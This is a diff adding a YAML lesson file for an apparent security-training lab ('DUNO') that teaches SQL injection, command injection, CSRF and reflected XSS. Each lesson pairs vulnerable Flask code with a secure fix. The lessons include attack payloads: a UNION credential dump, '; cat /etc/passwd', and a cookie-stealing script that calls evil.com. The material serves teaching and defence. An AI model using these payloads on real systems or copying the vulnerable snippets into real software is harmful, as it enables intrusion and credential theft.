@@ -1,0 +1,738 @@
+paths:
+- id: injection
+  title: Inyección y Bases de Datos
+  kicker: VULNERABILIDADES DE INYECCIÓN
+  desc: Fallos en la separación entre código y datos en consultas SQL, comandos del
+    sistema e inclusión de archivos.
+  icon: injection
+  modules_count: 5
+  slugs:
+  - sqli
+  - sqli_blind
+  - command_injection
+  - file_inclusion
+  - file_upload
+- id: auth
+  title: Autenticación y sesión
+  kicker: LÍMITES DE IDENTIDAD
+  desc: Mecanismos de autenticación, generación y validación de sesión, fuerza bruta
+    y bypass de CAPTCHA.
+  icon: auth
+  modules_count: 4
+  slugs:
+  - brute_force
+  - weak_session
+  - captcha
+  - auth_bypass
+- id: client
+  title: Lado del cliente y navegador
+  kicker: SEGURIDAD DEL NAVEGADOR
+  desc: Cross-Site Scripting (DOM, Reflejado, Almacenado), CSRF, manipulación de reglas
+    en JavaScript y evasión de CSP.
+  icon: client
+  modules_count: 5
+  slugs:
+  - xss_dom
+  - xss_reflected
+  - xss_stored
+  - csrf
+  - csp_bypass
+- id: access
+  title: Control de Acceso y Cripto
+  kicker: PERMISOS Y CRIPTO
+  desc: Ruptura de cifras débiles, filtración de hashes, desvío de rutas y elevación
+    de privilegios.
+  icon: access
+  modules_count: 3
+  slugs:
+  - auth_bypass
+  - open_redirect
+  - crypto
+- id: api
+  title: Seguridad y Lógica de la API
+  kicker: INTERFACES REST MODERNAS
+  desc: 'Superficie de ataque en APIs modernas: Broken Object Level Authorization
+    (BOLA), Mass Assignment y Versioning.'
+  icon: api
+  modules_count: 3
+  slugs:
+  - api_versioning
+  - mass_assignment
+  - api_security
+lessons:
+  sqli:
+    num: '07'
+    slug: sqli
+    title: Inyección SQL (En-Banda / UNION)
+    subtitle: Manipulação de consultas relacionais via interpolação não segura de
+      dados de entrada do usuário.
+    path_id: injection
+    path_name: Inyección y Bases de Datos
+    read_time: 11 min
+    difficulty: Fundamental • OWASP A03:2021
+    lab_endpoint: sqli.index
+    overview: La inyección SQL (SQLi) ocurre cuando los datos proporcionados por un
+      usuario o cliente externo se concatenan directamente en comandos SQL ejecutados
+      por la base de datos, sin parametrización o separación estricta entre instrucción
+      y dato. Esto permite que un operador altere la sintaxis de la consulta original,
+      extraiga datos no autorizados (UNION), omita mecanismos de autenticación (OR
+      1=1) o manipule tablas y registros.
+    why_it_happens: La causa raíz es la ruptura del principio de separación entre
+      código (sintaxis del SQL) y datos (valores proporcionados por el usuario). Los
+      desarrolladores frecuentemente utilizan interpolación directa de cadenas (como
+      f-strings en Python, operadores de concatenación '+' o sprintf) al construir
+      instrucciones SQL dinámicas, asumiendo incorrectamente que las entradas numéricas
+      o caracteres alfanuméricos son inofensivos.
+    how_it_works: 'Cuando la aplicación recibe una solicitud HTTP que contiene un
+      parámetro de búsqueda (ej: id=1), interpola ese valor en una cadena SQL. Si
+      el atacante envía ''1 OR 1=1'', la consulta original SELECT * FROM users WHERE
+      id = 1 se transforma en SELECT * FROM users WHERE id = 1 OR 1=1. Como la expresión
+      booleana 1=1 siempre es verdadera, el intérprete de SQLite o MySQL devuelve
+      todos los registros de la tabla en lugar de solo el registro consultado.'
+    diagram_steps:
+    - step: '01'
+      name: Entrada del Operador
+      desc: 'Carga útil inyectada vía formulario o parámetro GET/POST (ej: '' OR 1=1--)'
+    - step: '02'
+      name: Concatenación en la Aplicación
+      desc: Aplicación une cadena con comando SQL sin saneamiento
+    - step: '03'
+      name: Intérprete del Banco
+      desc: El motor SQL compila la nueva sintaxis inyectada como instrucción legítima
+    - step: '04'
+      name: Extracción No Autorizada
+      desc: Banco devuelve datos confidenciales o elude el control de acceso
+    anatomy:
+    - label: INPUT
+      content: Parámetro HTTP 'id' o 'user' sin tipado estricto en el controlador
+        Flask.
+    - label: PROCESSING
+      content: 'Montaje dinámico de query con f-string: f"SELECT ... WHERE id = ''{id}''".'
+    - label: VULNERABLE COMPONENT
+      content: Cursor de la conexión con la base ejecutando cadena no compilada.
+    - label: OUTPUT
+      content: Renderizado crudo de líneas adicionales o tablas arbitrarias vía UNION
+        SELECT.
+    recognition: 'Señales clásicas incluyen:
+
+      • Envío de comillas simples ('') o dobles (") generando errores de sintaxis
+      500 con mensajes de error del controlador de base de datos.
+
+      • Respuestas idénticas para consultas con expresiones booleanas como 1'' AND
+      ''1''=''1 y diferentes para 1'' AND ''1''=''2.
+
+      • Número de columnas inferido con ORDER BY 1, 2, 3... hasta que ocurra el error.'
+    attack_concept: 'En el entorno controlado del DUNO:
+
+      1. Enviar payload de unión: '' UNION SELECT null, username, password FROM users--
+
+      2. El intérprete combina el conjunto de resultados de la consulta original con
+      las credenciales administrativas de la tabla users.
+
+      3. Los hashes de contraseña de todos los operadores se muestran en la interfaz
+      del laboratorio.'
+    vulnerable_code: '# Nível LOW — Interpolação crua de string (Vulnerável)
+
+      user_id = request.args.get(''id'', '''')
+
+      query = f"SELECT first_name, last_name FROM users WHERE user_id = ''{user_id}''"
+
+      cursor.execute(query)  # O banco compila o dado do usuário como instrução!
+
+      results = cursor.fetchall()'
+    security_levels:
+    - level: LOW
+      status: Totalmente Vulnerable
+      desc: Interpolación directa con f-string sin ninguna validación de entrada.
+    - level: MEDIUM
+      status: Mitigación Parcial Frágil
+      desc: Filtro de comillas simples vía replace("'", ""), fácilmente eludible si
+        el campo es numérico (sin comillas en SQL).
+    - level: HIGH
+      status: Filtro Rigoroso
+      desc: Validación con regex bloqueando espacios, pero aún susceptible a comentarios
+        en línea como /**/.
+    - level: IMPOSSIBLE
+      status: Protección Definitiva
+      desc: Sentencias preparadas con consultas parametrizadas (placeholders '?').
+        Imposible inyectar sintaxis.
+    before_after:
+      vulnerable: cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")
+      secure: cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
+    defense: La única defensa definitiva contra SQL Injection es la utilización estricta
+      de **Consultas Parametrizadas (Prepared Statements)** o ORMs maduros (como SQLAlchemy).
+      En los Prepared Statements, la base de datos compila el plan de ejecución de
+      la consulta ANTES de recibir los parámetros. De esta forma, incluso si el atacante
+      envía ' OR 1=1, la base de datos interpreta ese valor puramente como una cadena
+      literal de búsqueda, y jamás como sintaxis ejecutable.
+    secure_code: "# Implementação Segura (Nível IMPOSSIBLE)\nuser_id = request.args.get('id',\
+      \ '')\n# Validação estrita de tipo (cast inteiro)\ntry:\n    clean_id = int(user_id)\n\
+      except ValueError:\n    return render_template('error.html', msg='ID inválido')\n\
+      \n# Consulta parametrizada com placeholder seguro\nquery = \"SELECT first_name,\
+      \ last_name FROM users WHERE user_id = ?\"\ncursor.execute(query, (clean_id,))\
+      \  # O banco trata o input estritamente como dado\nresults = cursor.fetchall()"
+    common_mistakes:
+    - Intentar crear listas negras manuales de palabras como 'SELECT' o 'UNION' (se
+      pueden eludir fácilmente con 'sElEcT' o codificación URL).
+    - Confiar en que la validación en JavaScript del navegador impide el envío de
+      payloads directos al endpoint.
+    - Escapar solo com comillas simples olvidando que las consultas numéricas (WHERE
+      id = 1) no requieren comillas para ser explotadas.
+    - Desactivar mensajes de error en el servidor pensando que esto elimina la falla
+      (solo convierte SQLi clásico en Blind SQLi).
+    quiz:
+      question: ¿Cuál es el único enfoque recomendado que previene la Inyección SQL
+        de manera estructural?
+      options:
+      - Escapar manualmente cada carácter especial recibido en el controlador
+      - Utilizar consultas parametrizadas (Prepared Statements) separando código y
+        datos
+      - Ocultar mensajes de error de la base de datos en la respuesta HTTP
+      - Cambiar la puerta estándar de conexión del servidor SQL
+      correct_index: 1
+      explanation: Consultas parametrizadas (Prepared Statements) compilan la sintaxis
+        SQL antes de recibir los valores, garantizando matemáticamente que la entrada
+        del usuario sea tratada como dato literal, nunca como comando ejecutable.
+    checklist:
+    - Comprender la diferencia entre una instrucción SQL y los datos del usuario.
+    - Identificar interpolación insegura de cadenas en llamadas a la base de datos.
+    - Construir y probar payloads de unión y bypass booleano en laboratorio.
+    - Explicar la evolución de seguridad de los niveles Low a Impossible en DUNO.
+    - Implementar Prepared Statements en Python con sqlite3 y SQLAlchemy.
+  command_injection:
+    num: '02'
+    slug: command_injection
+    title: Inyección de Comandos (RCE)
+    subtitle: Execução arbitrária de comandos no sistema operacional hospedeiro via
+      shell do servidor.
+    path_id: injection
+    path_name: Inyección y Bases de Datos
+    read_time: 12 min
+    difficulty: Crítico • OWASP A03:2021
+    lab_endpoint: command_injection.index
+    overview: La inyección de comandos ocurre cuando una aplicación web pasa parámetros
+      proporcionados por el usuario directamente al shell del sistema operativo subyacente
+      (como bash, sh o cmd.exe) a través de funciones como os.system(), subprocess.Popen(...,
+      shell=True) o exec(). El atacante encadena comandos arbitrarios, obteniendo
+      Ejecución Remota de Código (RCE).
+    why_it_happens: 'Ocurre cuando la aplicación utiliza utilidades del sistema operativo
+      para realizar tareas que podrían hacerse con bibliotecas nativas (ej: ejecutar
+      ''ping -c 3 {ip}'' o ''convert {file}''), pasando la entrada del usuario concatenada
+      sin saneamiento o sin desactivar la interpretación del shell.'
+    how_it_works: Operadores de control de shell (como ';' en Linux, '&', '&&', '||'
+      o pipes '|') permiten ejecutar múltiples comandos secuencialmente. Al enviar
+      '127.0.0.1; whoami', el shell ejecuta primero el ping y, luego, ejecuta el comando
+      'whoami' con los privilegios del proceso web.
+    diagram_steps:
+    - step: '01'
+      name: Entrada Maliciosa
+      desc: 'El parámetro contiene separador de comandos de shell (ej: ; cat /etc/passwd)'
+    - step: '02'
+      name: Llamada al Shell
+      desc: Aplicación invoca shell=True con cadena concatenada
+    - step: '03'
+      name: Ejecución por el SO
+      desc: El kernel ejecuta el comando auxiliar con los permisos del usuario del
+        proceso
+    - step: '04'
+      name: Salida en el Navegador
+      desc: La respuesta del comando del sistema operativo se imprime en la página
+        web
+    anatomy:
+    - label: INPUT
+      content: Campo de formulario o parámetro de consulta destinado a una IP o nombre
+        de host.
+    - label: PROCESSING
+      content: Uso de shell=True en subprocess o os.popen(f'ping -c 3 {ip}').
+    - label: VULNERABLE COMPONENT
+      content: Instancia de /bin/sh invocada para interpretar toda la línea de comandos.
+    - label: OUTPUT
+      content: Stdout del sistema operativo devuelto directamente en la página.
+    recognition: 'Identificado probando caracteres de control de shell: ;, &&, ||,
+      |, `id`, $(id). Si el comando secundario altera el tiempo de respuesta (sleep
+      5) o imprime texto del SO, la falla está presente.'
+    attack_concept: 'En DUNO:
+
+      1. Inyectar: 127.0.0.1; cat /etc/passwd
+
+      2. El servidor ejecuta el ping y luego lista el archivo de cuentas del contenedor
+      Linux.
+
+      3. Encadenando un shell reverso, se obtiene control total del contenedor.'
+    vulnerable_code: '# Nível LOW — Execução via Shell com string concatenada (Crítico)
+
+      target = request.form.get(''ip'', '''')
+
+      cmd = f''ping -c 3 {target}''
+
+      # shell=True faz com que o /bin/sh processe ponto-e-vírgula e pipes!
+
+      output = subprocess.check_output(cmd, shell=True)'
+    security_levels:
+    - level: LOW
+      status: Vulnerable
+      desc: shell=True con f-string sin ninguna validación.
+    - level: MEDIUM
+      status: Filtro Débil
+      desc: Sustitución de '&&' y ';' por vacío, evitable con '|' o salto de línea
+        '\n'.
+    - level: HIGH
+      status: Lista de Bloqueo
+      desc: Filtro de caracteres comunes, evitables con sustitución de variables o
+        codificación.
+    - level: IMPOSSIBLE
+      status: Seguro
+      desc: Uso de lista de argumentos [ping, -c, 3, ip] con shell=False y validación
+        de IP mediante ipaddress.ip_address().
+    before_after:
+      vulnerable: subprocess.check_output(f'ping -c 3 {ip}', shell=True)
+      secure: subprocess.check_output(['ping', '-c', '3', valid_ip], shell=False)
+    defense: '1. Evitar llamadas al sistema operativo: utilice bibliotecas nativas
+      del lenguaje (ej: socket para probar conectividad).
+
+      2. Si es inevitable, utilice SIEMPRE shell=False pasando los argumentos como
+      una lista de cadenas [cmd, arg1, arg2]. De esta forma, los separadores como
+      '';'' se tratan como argumentos literales y nunca como operadores de control
+      del shell.'
+    secure_code: "# Nível IMPOSSIBLE — shell=False e validação de tipo\nimport ipaddress\n\
+      ip = request.form.get('ip', '')\ntry:\n    # Valida se é um IP IPv4 ou IPv6\
+      \ válido matematicamente\n    valid_ip = str(ipaddress.ip_address(ip))\nexcept\
+      \ ValueError:\n    return 'Endereço IP inválido.'\n\n# Argumentos isolados em\
+      \ array — shell=False é padrão no run()\nres = subprocess.run(['ping', '-c',\
+      \ '3', valid_ip], capture_output=True, text=True)"
+    common_mistakes:
+    - "Usar shell=True pensando que higienizar ';' es suficiente (existen decenas\
+      \ de separadores como |, ||, &, &&, \n, $(), ``)."
+    - Intentar validar IPs con expresiones regulares simplificadas que permiten sufijos
+      maliciosos.
+    - Ejecutar el servidor web como root en el contenedor.
+    quiz:
+      question: ¿Qué práctica impide la inyección de comandos incluso si la entrada
+        contiene caracteres como ';' o '&'?
+      options:
+      - Ejecutar el comando pasando una lista de argumentos con shell=False
+      - Reemplazar el punto y coma por espacio
+      - Agregar comillas dobles alrededor de la variable dentro de la cadena
+      - Ejecutar el script con sudo en el terminal
+      correct_index: 0
+      explanation: Al desactivar el shell (shell=False) y pasar argumentos en formato
+        de lista, el binario ejecutable recibe el dato directamente como argumento
+        por el kernel (vía syscall execve), impidiendo la interpretación de operadores
+        de control.
+    checklist:
+    - Identificar invocaciones de sistema operativo con shell=True.
+    - Reconocer operadores de encadenamiento de comandos (; , && , || , |).
+    - Validar entradas estrictamente usando analizadores nativos como ipaddress.
+    - Refactorizar ejecuciones de shell a listas de argumentos directas con shell=False.
+  csrf:
+    num: '03'
+    slug: csrf
+    title: Falsificación de solicitudes entre sitios (CSRF)
+    subtitle: Indução de ações não intencionais em uma aplicação web autenticada através
+      da confiança do navegador nos cookies de sessão.
+    path_id: client
+    path_name: Lado del cliente y navegador
+    read_time: 10 min
+    difficulty: Intermediário • OWASP A01:2021
+    lab_endpoint: csrf.index
+    overview: CSRF es una vulnerabilidad donde un sitio malicioso induce al navegador
+      de la víctima a ejecutar acciones no autorizadas en una aplicación en la que
+      la víctima está autenticada. Como el navegador envía automáticamente las cookies
+      de sesión en solicitudes al dominio de destino, el servidor asume falsamente
+      que la solicitud fue intencionada.
+    why_it_happens: 'Sucede porque el protocolo HTTP por defecto era ''stateless'',
+      delegando la identidad a cookies mantenidas en el cliente. Si el servidor procesa
+      solicitudes de cambio de estado (ej: cambiar contraseña, transferir fondos)
+      basándose únicamente en cookies sin exigir un token secreto imprevisible por
+      solicitud, el ataque es viable.'
+    how_it_works: El atacante crea una página HTML que contiene un formulario oculto
+      o imagen que apunta al endpoint vulnerable de la aplicación. Al visitar la página
+      maliciosa, un script JavaScript envía el formulario automáticamente. El navegador
+      incluye la cookie session_id del usuario, y la contraseña se cambia sin el consentimiento
+      de la víctima.
+    diagram_steps:
+    - step: '01'
+      name: Víctima Autenticada
+      desc: Usuario inicia sesión en DUNO y mantiene la sesión activa en el navegador
+    - step: '02'
+      name: Acceso a Sitio Malicioso
+      desc: Víctima abre enlace en otra pestaña con formulario invisible
+    - step: '03'
+      name: Disparo Automático
+      desc: JavaScript en el sitio malicioso dispara POST al DUNO
+    - step: '04'
+      name: Acción Ejecutada
+      desc: El navegador envía la cookie y el servidor cambia la contraseña sin validación
+        de origen
+    anatomy:
+    - label: INPUT
+      content: Formulario de cambio de contraseña enviado vía POST o GET.
+    - label: PROCESSING
+      content: Validación de usuario realizada únicamente por session['user_id'].
+    - label: VULNERABLE COMPONENT
+      content: Ausencia de token Anti-CSRF o validación de cabecera Origin/Referer.
+    - label: OUTPUT
+      content: Modificación silenciosa de datos o credenciales del usuario.
+    recognition: Verificar si las solicitudes POST/PUT que modifican datos sensibles
+      poseen tokens sincronizadores y si las cookies tienen SameSite=Strict.
+    attack_concept: 'EN DUDO: Crear una página externa con un formulario que envíe
+      a http://localhost:2300/modules/csrf con nueva contraseña. Al cargar la página,
+      la contraseña del admin se sobrescribe.'
+    vulnerable_code: "# Nível LOW — Confia cegamente nos cookies de sessão (Vulnerável)\n\
+      @bp.route('/change_password', methods=['POST'])\n@login_required\ndef change_password():\n\
+      \    new_pass = request.form.get('password_new')\n    # Não há verificação de\
+      \ token ou confirmação de senha atual!\n    update_user_password(session['user_id'],\
+      \ new_pass)\n    return 'Senha alterada com sucesso!'"
+    security_levels:
+    - level: LOW
+      status: Vulnerable
+      desc: Ninguna protección. Las solicitudes GET o POST solo cambian el estado
+        con cookie.
+    - level: MEDIUM
+      status: Verificación de Referente
+      desc: Verifica si 'Referer' contiene el nombre del dominio, evitable mediante
+        subdominios o supresión de referer.
+    - level: HIGH
+      status: Token Débil / Estático
+      desc: Token previsible o reutilizable entre sesiones.
+    - level: IMPOSSIBLE
+      status: Token Criptográfico Anti-CSRF
+      desc: Token único criptográficamente seguro (token CSRF) generado por sesión,
+        exigiendo revalidación de la contraseña actual.
+    before_after:
+      vulnerable: 'if request.method == ''POST'': update_password(new_pass)'
+      secure: 'if not hmac.compare_digest(request.form.get(''csrf_token''), session[''csrf_token'']):
+        abort(403)'
+    defense: '1. Implementar tokens anti-CSRF criptográficos sincronizados (Patrón
+      de Token Sincronizador).
+
+      2. Configurar cookies de sesión con atributos modernos: SameSite=Lax o SameSite=Strict,
+      Secure y HttpOnly.
+
+      3. Para acciones críticas (cambiar contraseña o correo electrónico), siempre
+      solicitar la confirmación de la contraseña actual (Reautenticación).'
+    secure_code: "# Nível IMPOSSIBLE — Token sincronizador com hmac seguro e SameSite\n\
+      import secrets, hmac\n\n# Geração do token na sessão do usuário\nsession['csrf_token']\
+      \ = secrets.token_hex(32)\n\n# Validação na submissão\ntoken = request.form.get('csrf_token',\
+      \ '')\nif not hmac.compare_digest(token, session.get('csrf_token', '')):\n \
+      \   abort(403)  # Rejeita requisição forjada!"
+    common_mistakes:
+    - Usar métodos GET para operaciones que alteran el estado (como /delete_account?id=5).
+    - Validar el token solo si se envía, permitiendo bypass si el atacante omite el
+      campo.
+    - Confiar únicamente en el encabezado Referer, que puede ser omitido por políticas
+      de navegación o proxies.
+    quiz:
+      question: ¿Por qué el atributo 'SameSite=Strict' en las cookies ayuda a mitigar
+        los ataques CSRF?
+      options:
+      - Porque él encripta todo el tráfico HTTP con RSA
+      - Porque impide que el navegador envíe la cookie en cualquier solicitud realizada
+        por sitios de terceros
+      - Porque él exige que la contraseña tenga más de 12 caracteres
+      - Porque él elimina la cookie automáticamente cada 5 segundos
+      correct_index: 1
+      explanation: Con SameSite=Strict, el navegador se niega terminantemente a incluir
+        la cookie en solicitudes que se originaron desde un dominio externo (cross-site),
+        neutralizando la premisa fundamental del CSRF.
+    checklist:
+    - Comprender cómo los navegadores gestionan credenciales cross-site.
+    - Construir un PoC de explotación CSRF con formulario automático en HTML.
+    - Implementar la validación del patrón de token sincronizador en el backend.
+    - Configurar flags de cookies SameSite, HttpOnly y Secure.
+  xss_reflected:
+    num: '11'
+    slug: xss_reflected
+    title: Cross-Site Scripting (Reflejado)
+    subtitle: Injeção de payloads JavaScript arbitrários refletidos imediatamente
+      na resposta HTTP pelo servidor.
+    path_id: client
+    path_name: Lado del cliente y navegador
+    read_time: 11 min
+    difficulty: Fundamental • OWASP A03:2021
+    lab_endpoint: xss_reflected.index
+    overview: Reflected XSS ocurre cuando una aplicación web recibe datos en una solicitud
+      HTTP (generalmente parámetros de consulta en URLs) y los incluye directamente
+      en el código HTML de la respuesta sin sanitización o codificación contextual
+      (context-aware escaping). El script se ejecuta en el contexto de seguridad del
+      navegador de la víctima que accede al enlace malicioso.
+    why_it_happens: Los desarrolladores imprimen variables de búsqueda, mensajes de
+      error o nombres de parámetros en el HTML creyendo que el navegador tratará el
+      contenido solo como texto puro, olvidando que el navegador renderiza cualquier
+      etiqueta <script> o atributo de evento (onload, onerror) que encuentre.
+    how_it_works: 'El atacante crea un enlace malicioso que contiene una carga útil:
+      ?name=<script>fetch(''http://evil.com/steal?cookie=''+document.cookie)</script>.
+      Cuando la víctima hace clic en el enlace, el servidor refleja la carga útil
+      en el HTML renderizado, y el navegador de la víctima ejecuta el script en el
+      dominio legítimo.'
+    diagram_steps:
+    - step: '01'
+      name: Envío del enlace
+      desc: El atacante induce a la víctima a hacer clic en un enlace manipulado con
+        payload JS
+    - step: '02'
+      name: Reflexión en el Servidor
+      desc: La aplicación incluye el parámetro sin escape en el cuerpo del HTML devuelto
+    - step: '03'
+      name: Renderizado en el navegador
+      desc: El navegador de la víctima compila el script malicioso
+    - step: '04'
+      name: Exfiltración de sesión
+      desc: El script roba tokens de sesión (document.cookie) y los envía al atacante
+    anatomy:
+    - label: INPUT
+      content: 'Parámetro GET de la URL (ej: ?query=... o ?msg=...).'
+    - label: PROCESSING
+      content: Interpolación directa en la plantilla sin filtro HTML o uso de |safe
+        en Jinja2.
+    - label: VULNERABLE COMPONENT
+      content: Contexto de renderizado HTML del navegador.
+    - label: OUTPUT
+      content: Ejecución de JavaScript arbitrario en el contexto del origen del sitio.
+    recognition: Inyectar cadenas canario como '<h1>teste</h1>' o '" autofocus onfocus="alert(1)'.
+      Si las etiquetas son interpretadas por el navegador, la falla existe.
+    attack_concept: 'En DUNO:
+
+      Inyectar <img src=x onerror="alert(''XSS: ''+document.domain)">
+
+      Observar la caja de alerta indicando que el JavaScript se está ejecutando en
+      el contexto de seguridad de la aplicación.'
+    vulnerable_code: "# Nível LOW — Desativação do autoescaping ou marcação com |safe\n\
+      @bp.route('/search')\ndef search():\n    q = request.args.get('q', '')\n   \
+      \ # Jinja2 |safe desativa o escape nativo, renderizando HTML cru!\n    return\
+      \ render_template_string(f'<h1>Resultado para: {q}</h1>')"
+    security_levels:
+    - level: LOW
+      status: Vulnerable
+      desc: Inclusión directa sin escaping. Las etiquetas <script> se ejecutan sin
+        restricción.
+    - level: MEDIUM
+      status: Filtro Simple
+      desc: Sustitución de '<script>' por vacío (bypass con '<sCrIpt>' o '<img src=x
+        onerror=...>').
+    - level: HIGH
+      status: Filtro Regex
+      desc: Bloquea etiquetas script e img, evitable mediante manejadores de eventos
+        en etiquetas como <svg/onload=alert(1)>.
+    - level: IMPOSSIBLE
+      status: Escape consciente del contexto
+      desc: Uso de html.escape() o auto-escape nativo de Jinja2, además de encabezado
+        Content-Security-Policy.
+    before_after:
+      vulnerable: 'f''<h1>Busca: {user_input}</h1>''  # Renderizado diretamente'
+      secure: 'f''<h1>Busca: {html.escape(user_input)}</h1>''  # Converte < para &lt;'
+    defense: '1. Codificación de salida consciente del contexto: codificar todos los
+      datos reflejados de acuerdo con el contexto (cuerpo HTML, atributos, bloques
+      de JavaScript).
+
+      2. Política de Seguridad de Contenidos (CSP): restringir de dónde se pueden
+      cargar los scripts y bloquear los scripts en línea.
+
+      3. Cookie HttpOnly: impide que JavaScript acceda a las cookies de autenticación
+      incluso en caso de falla de XSS.'
+    secure_code: '# Nível IMPOSSIBLE — Escaping contextual e CSP
+
+      import html
+
+      q = request.args.get(''q'', '''')
+
+      safe_q = html.escape(q)  # Converte < > & " '' em entidades HTML inofensivas
+
+      return render_template(''search.html'', query=safe_q)'
+    common_mistakes:
+    - 'Usar listas de palabras bloqueadas para etiquetas (ej: eliminar ''<script>''
+      — existen cientos de etiquetas y eventos HTML que ejecutan JS).'
+    - Confiar en las validaciones en el cliente.
+    - 'Creer que colocar datos dentro de atributos (ej: <input value=''{q}''>) es
+      seguro sin escapar las comillas.'
+    quiz:
+      question: ¿Cuál es la principal defensa contra Cross-Site Scripting al mostrar
+        entradas de usuarios en el cuerpo de una página HTML?
+      options:
+      - 'Utilizar codificación de salida consciente del contexto (ej: convertir ''<''
+        en ''&lt;'' y ''>'' en ''&gt;'')'
+      - Bloquear palabras con letras mayúsculas en el controlador
+      - Verificar el User-Agent de la solicitud
+      - Usar el protocolo HTTPS para cifrar el canal
+      correct_index: 0
+      explanation: La codificación contextual (Output Encoding) garantiza que los
+        caracteres de control HTML se muestren solo como texto visible y nunca sean
+        interpretados por el motor de renderizado del navegador como etiquetas ejecutables.
+    checklist:
+    - Diferenciar Reflected, Stored y DOM-based XSS.
+    - Identificar contextos de inyección (cuerpo HTML, atributos, scripts).
+    - Aplicar codificación contextual con html.escape().
+    - Configurar encabezados de protección (CSP y cookies HttpOnly).
+modules:
+- - '01'
+  - Fuerza Bruta
+  - brute_force
+  - auth
+  - Autenticación y sesión
+  - Ruptura de credenciales mediante diccionario y fuerza bruta contra endpoints de
+    autenticación.
+  - 10 min
+  - Fundamental
+- - '02'
+  - Inyección de comandos
+  - command_injection
+  - injection
+  - Inyección y Bases de Datos
+  - Ejecución arbitraria de comandos en el sistema operativo a través de parámetros
+    desprotegidos.
+  - 12 min
+  - Crítico
+- - '03'
+  - CSRF
+  - csrf
+  - client
+  - Lado del cliente y navegador
+  - Falsificación de solicitudes cross-site explotando la persistencia de sesión y
+    las cookies del navegador.
+  - 10 min
+  - Intermedio
+- - '04'
+  - Inclusión de archivos
+  - file_inclusion
+  - injection
+  - Inyección y Bases de Datos
+  - Inclusión dinámica de archivos locales (LFI) y remotos mediante manipulación de
+    rutas.
+  - 11 min
+  - Alto
+- - '05'
+  - Subir archivo
+  - file_upload
+  - injection
+  - Inyección y Bases de Datos
+  - Subida irrestricta de archivos ejecutables eludiendo las validaciones de extensión
+    y tipo MIME.
+  - 12 min
+  - Crítico
+- - '06'
+  - CAPTCHA inseguro
+  - captcha
+  - auth
+  - Autenticación y sesión
+  - Bypass de mecanismos de validación CAPTCHA por falla lógica en el flujo de validación.
+  - 9 min
+  - Intermedio
+- - '07'
+  - Inyección SQL
+  - sqli
+  - injection
+  - Inyección y Bases de Datos
+  - Extracción y manipulación de datos en consultas SQL mediante UNION, OR 1=1 y comentarios.
+  - 11 min
+  - Fundamental
+- - 08
+  - Inyección SQL (Ciega)
+  - sqli_blind
+  - injection
+  - Inyección y Bases de Datos
+  - Inferencia de datos carácter por carácter a través de respuestas booleanas y retrasos
+    de tiempo.
+  - 14 min
+  - Avanzado
+- - 09
+  - IDs de sesión débiles
+  - weak_session
+  - auth
+  - Autenticación y sesión
+  - Sesiones previsibles con generación secuencial que posibilitan el secuestro de
+    cuentas.
+  - 9 min
+  - Fundamental
+- - '10'
+  - XSS (DOM)
+  - xss_dom
+  - client
+  - Lado del cliente y navegador
+  - Ejecución de scripts maliciosos inyectados directamente en el DOM por el navegador.
+  - 10 min
+  - Intermedio
+- - '11'
+  - XSS (Reflejado)
+  - xss_reflected
+  - client
+  - Lado del cliente y navegador
+  - Inyección de payload JavaScript reflejado directamente en la respuesta HTTP del
+    servidor.
+  - 11 min
+  - Fundamental
+- - '12'
+  - XSS (Almacenado)
+  - xss_stored
+  - client
+  - Lado del cliente y navegador
+  - Persistencia de scripts maliciosos en bases de datos ejecutados para otros usuarios.
+  - 12 min
+  - Alto
+- - '13'
+  - Elusión de CSP
+  - csp_bypass
+  - client
+  - Lado del cliente y navegador
+  - Evasión de la política de seguridad de contenido permisiva a través de JSONP y
+    scripts en línea.
+  - 13 min
+  - Avanzado
+- - '14'
+  - Ataques de JavaScript
+  - js_attacks
+  - client
+  - Lado del cliente y navegador
+  - Manipulación de cálculos y reglas de negocio validadas exclusivamente en el front-end.
+  - 9 min
+  - Fundamental
+- - '15'
+  - Elusión de autorización
+  - auth_bypass
+  - access
+  - Control de Acceso y Cripto
+  - Elevación de privilegios y acceso indebido a paneles administrativos restringidos.
+  - 11 min
+  - Alto
+- - '16'
+  - Redirección HTTP Abierta
+  - open_redirect
+  - access
+  - Control de Acceso y Cripto
+  - Desvío de usuarios hacia dominios arbitrarios a través de parámetros de redireccionamiento.
+  - 8 min
+  - Bajo
+- - '17'
+  - Criptografía
+  - crypto
+  - access
+  - Control de Acceso y Cripto
+  - Ruptura de hashes heredados y cifras débiles utilizadas para proteger datos confidenciales.
+  - 10 min
+  - Intermedio
+- - '18'
+  - Versionado de API
+  - api_versioning
+  - api
+  - Seguridad y Lógica de la API
+  - Acceso y explotación de endpoints legados obsoletos (/v1) sin correcciones de
+    seguridad.
+  - 9 min
+  - Intermedio
+- - '19'
+  - Asignación masiva
+  - mass_assignment
+  - api
+  - Seguridad y Lógica de la API
+  - Sobrescritura de propiedades sensibles mediante la inyección de parámetros adicionales
+    en JSON.
+  - 11 min
+  - Alto
+- - '20'
+  - Seguridad de API
+  - api_security
+  - api
+  - Seguridad y Lógica de la API
+  - Fallos críticos en APIs REST incluyendo BOLA, limitación de tasa y filtración
+    de tokens.
+  - 13 min
+  - Crítico
